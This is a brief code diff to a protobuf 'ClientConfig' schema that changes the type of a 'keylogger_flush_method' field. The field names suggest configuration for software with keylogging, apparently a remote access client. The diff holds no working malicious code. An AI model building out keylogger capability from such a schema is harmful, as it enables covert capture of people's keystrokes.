@@ -52,7 +52,7 @@ message ClientConfig {
 
 	optional bool allow_misc_connections = 23;
 	
-	optional FLUSH_METHOD keylogger_flush_method = 24;
+	optional Trigger keylogger_flush_method = 24;
 	optional int32 keylogger_flush_value = 25;
 	
 }
